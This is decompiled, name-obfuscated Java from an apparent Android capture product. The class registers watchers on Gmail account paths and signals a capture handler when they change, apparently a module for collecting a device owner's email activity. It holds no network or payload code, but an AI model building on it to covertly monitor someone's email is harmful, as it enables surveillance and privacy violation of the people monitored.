package com.vvt.capture.email.gmail.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.n.a.b;
import java.util.HashSet;
import java.util.Iterator;

public class a
  implements e, com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private i c;
  private b d;
  private boolean e;
  
  public a(b paramb, String paramString)
  {
    this.d = paramb;
    this.e = false;
  }
  
  private void a()
  {
    String str = c.a();
    if (str != null)
    {
      Object localObject = c.a(str);
      Iterator localIterator = ((HashSet)localObject).iterator();
      for (;;)
      {
        boolean bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        localObject = (String)localIterator.next();
        b localb = this.d;
        localObject = com.vvt.capture.email.gmail.c.a(str, (String)localObject);
        localb.a((String)localObject, this);
      }
    }
  }
  
  public void a(i parami)
  {
    boolean bool = b;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      Object localObject = this.d;
      if (localObject != null)
      {
        String str = c.a();
        if (str != null)
        {
          localObject = c.a(str);
          Iterator localIterator = ((HashSet)localObject).iterator();
          for (;;)
          {
            bool = localIterator.hasNext();
            if (!bool) {
              break;
            }
            localObject = (String)localIterator.next();
            b localb = this.d;
            localObject = com.vvt.capture.email.gmail.c.a(str, (String)localObject);
            localb.a((String)localObject, this);
          }
        }
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    a();
    i locali = this.c;
    locali.a();
    bool = b;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      Object localObject = this.d;
      if (localObject != null)
      {
        String str = c.a();
        if (str != null)
        {
          localObject = c.a(str);
          Iterator localIterator = ((HashSet)localObject).iterator();
          for (;;)
          {
            bool = localIterator.hasNext();
            if (!bool) {
              break;
            }
            localObject = (String)localIterator.next();
            b localb = this.d;
            localObject = com.vvt.capture.email.gmail.c.a(str, (String)localObject);
            localb.a((String)localObject);
          }
        }
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */